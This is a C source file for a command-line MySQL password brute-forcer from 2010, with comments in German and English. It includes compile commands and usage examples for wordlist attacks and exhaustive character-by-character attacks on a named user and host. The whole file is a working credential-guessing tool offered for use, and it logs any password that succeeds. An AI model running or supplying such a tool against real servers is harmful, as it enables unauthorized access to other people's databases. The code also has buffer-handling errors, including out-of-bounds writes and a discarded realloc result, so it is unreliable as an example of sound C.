#include <stdio.h>
#include <mysql/mysql.h>
#include <curses.h>
#include <string.h>
#include <stdlib.h>

// Deutsch oder English
#define GER 1
#define ENG 0
/*
**************************************************************************************************
*  MYSQL Bruteforce Programm aus purer lange Weile geschrieben
*   23.03 2010 by cd
*
*   gcc mysql-bruteforce.c -o mysql-bruteforce -lmysqlclient -lncurses -O2 -Wall
*   oder -O6 anstatt -O2
*  ./mysql-bruteforce benutzer computer kennwortliste <optional lÃ¤nge des kennworts>
*  log Datei ist "mysql-bruteforce.log"
*
**************************************************************************************************
**************************************************************************************************
*
*  for the people that understand no german change the #define ENG to 1 and GER to 0
*
*  compile with: gcc mysql-bruteforce.c -o mysql-bruteforce -lmysqlclient -lncurses -O3 -Wall
*  or -O6 instead of -O2
*  usage: ./mysql-bruteforce user host <password list> <optional len of password>
*  log file is "mysql-bruteforce.log"
*
**************************************************************************************************
*
*   Newest version http://code-reference.com
*
*   Think about the old good time MoD
*   If you want to survive out here, you've got to know where your towel is.
*/

MYSQL *my;

int count=0;
char *passwd;

#define STARTCHR 46 // 33 set start ascii char
#define ENDCHR 122  // 127 set end ascii cahr
#define BUFF_SIZE 1024
#define LEN 80

char buffer[BUFF_SIZE];
int jump=0;

int main (int argc, char *argv[])
{
   if (argc <= 3 ) {
#if ENG && !GER
      printf("\n"
             "\n   MySQL Bruteforce, written by cd\n\n"
             "    via wordlist\n"
             "    %s root localhost wordlist       # use complete wordlist\n"
             "    %s root 127.0.0.1 ../wordlist 7  # serch only words with 7 chars\n"
             "\n"
             "    standard bruteforce\n"
             "    %s root localhost -b      # Bruteforce Method (standard up to 8 chars)\n"
             "    %s root 127.0.0.1 -b 12   # up to 12 chars\n"
             "    %s root host -b 12 Test   # start with the given Word\n\n\n\n\n",argv[0],argv[0],argv[0],argv[0],argv[0]);
#else
      printf("\n"
             "\n   MySQL Bruteforce, geschrieben von cd\n\n"
             "    via WÃ¶rterliste\n"
             "    %s root localhost wordlist       # Gesamte WÃ¶rterliste durchsuchen\n"
             "    %s root 127.0.0.1 ../wordlist 7  # suche nur WÃ¶rter mit 7 Buchstaben\n"
             "\n"
             "    Standard Bruteforce\n"
             "    %s root localhost -b      # Bruteforce Methode (standard bis zu 8 Buchstaben)\n"
             "    %s root 127.0.0.1 -b 12   # bis zu 12 Buchstaben\n"
             "    %s root host -b 12 Test   # Startet mit angegebenen Wort\n\n\n\n\n",argv[0],argv[0],argv[0],argv[0],argv[0]);
#endif
      return 0;
   }

   if(strcmp(argv[3],"-b")) {
      jump=0;
   } else jump=1;

   initscr();
   printw("\n#################################\n#\tMYSQL Bruteforce\t#\n#\t2010 by cd\t\t#\n#################################\n\n\t\n");
   refresh();

   char host[20];
   char user[20];
   my = mysql_init(NULL);
   FILE *pass_list,*logfile;

   if( ( pass_list=fopen(argv[3],"r") ) == NULL && jump!=1 ) {
#if ENG && !GER
      fprintf(stderr,"Cannot open File \"%s\"\n", argv[3]);
#else
      fprintf(stderr,"Kann Datei \"%s\" nicht oeffnen.\n", argv[3]);
#endif
      endwin();
      return 0;
   }

   if( ( logfile=fopen("mysql-bruteforce.log","a+") ) == NULL ) {
#if ENG && !GER
      fprintf(stderr,"Cannot open File \"%s\"\n", argv[3]);
#else
      fprintf(stderr,"Kann Datei \"%s\" nicht oeffnen.\n", argv[3]);
#endif
      endwin();
      return 0;
   }

   if(my == NULL) {
#if ENG && !GER
      fprintf(stderr, "Initialization failed\n");
#else
      fprintf(stderr, "Initialisierung fehlgeschlagen\n");
#endif
      endwin();
      return 0;
   }

   sprintf(user, "%s", argv[1]);
   sprintf(host, "%s", argv[2]);

   char eingabe;

#if ENG && !GER
   mvprintw(5,2,"User: %s Host: %s ",user,host);
#else
   mvprintw(5,2,"Benutzer: %s Server: %s ",user,host);
#endif

   if (jump==1) {
      refresh();
      eingabe='b';

   } else {
      eingabe='w';
   }

   switch(eingabe) {
      case 'b':
         while(1) {
            int min=1,max;
            if (argc<=4) {
               max=8;
            } else {
               max=atoi(argv[4]);
            }

            char *pass=(char*)malloc(min);
            int pos,x,found;

            pass[min]='\0';


            if (argc>=6) {
               min=strlen(argv[5]);
               pass=argv[5];
               pass[min+1]='\0';
               pos=min;
               if (atoi(argv[4])!=strlen(argv[5])) {
#if ENG && !GER
                  mvprintw(7,0,"len of word must be the same the digit after -b\n"
                           "like: %s root localhost -b 4 abcd\n",argv[0]);
#else
                  mvprintw(7,0,"lÃ¤nge des Wortes muss die gleiche seien wie die zahl nach -b\n"
                           "z.B: %s root localhost -b 4 abcd\n",argv[0]);
#endif
                  refresh();
                  endwin();
                  return 0;
               }

            }

            for(x=min; x<=max; x++) {
               if(x>min) {
                  if (realloc(pass, x)) {
                     memset(pass, STARTCHR, x);
                     pass[x]='\0';
                  } else {
                     mvprintw(13,1,"error in realloc");
                     endwin();
                     return 1;
                  }
               }
               while(pass[0]<ENDCHR) {
                  found=0;
                  if( mysql_real_connect (my,host,user,pass,NULL,0,NULL,0)  == NULL) {
                     move(6,2);
                     deleteln();
                     mvprintw(6,2,"Pass: %s",pass);
                     refresh();
                  } else {
                     move(6,2);
                     deleteln();
                     mvprintw(6,2,"Pass: %s",pass);
                     refresh();
#if ENG && !GER
                     mvprintw(8,2,"Login Success:\t %s:%s@%s\n",user,pass,host);
#else
                     mvprintw(8,2,"Login Erfolgreich:\t %s:%s@%s\n",user,pass,host);
#endif
                     refresh();
                     endwin();
                     mysql_close(my);
                     fprintf(logfile,"%s:%s@%s\r\n",user,pass,host);
                     return 0;
                  }

                  for(pos=x-1; pos!=0; pos--) {
                     if(pass[pos]==ENDCHR) {
                        memset(pass+pos, STARTCHR, strlen(pass)-pos);
                        pass[pos-1]++;
                        found=1;
                        break;
                     }
                  }

                  if(!found)
                     pass[x-1]++;
                  count++;
               }
            }

            move(6,2);
            deleteln();
#if ENG && !GER
            mvprintw(8,2,"Password not found for %s@%s :/",user,host);
#else
            mvprintw(8,2,"Passwort fuer %s@%s nicht gefunden :/",user,host);
#endif
            refresh();
            endwin();
            mysql_close (my);
            return 0;
         }
         break;
   }

   int dummy;
   while((fscanf(pass_list, "%s\r\n", buffer))!=EOF) {
      if (argv[4]) {
         if (strlen(buffer)!=atoi(argv[4])) goto next; // blubb goto i know ^^ phuu
      }

      if( mysql_real_connect (my,host,user,buffer,NULL,0,NULL,0)  == NULL) {
         move(6,2);
         deleteln();
         mvprintw(6,2,"Pass: %s",buffer);
         refresh();
      } else {
         move(6,2);
         deleteln();
         mvprintw(6,2,"Pass: %s",buffer);
         refresh();
#if ENG && !GER
         mvprintw(8,2,"Login Success:\t %s:%s@%s\n",user,buffer,host);
#else
         mvprintw(8,2,"Login Erfolgreich:\t %s:%s@%s\n",user,buffer,host);
#endif
         refresh();
         endwin();
         mysql_close(my);
         fprintf(logfile,"%s:%s@%s\r\n",user,buffer,host);
         return 0;
      }
   next:
      dummy=1;
   }

   move(6,2);
   deleteln();
#if ENG && !GER
   mvprintw(8,2,"Password not found for %s@%s :/",user,host);
#else
   mvprintw(8,2,"Passwort fuer %s@%s nicht gefunden :/",user,host);
#endif
   refresh();
   endwin();
   mysql_close (my);
   return 0;
}
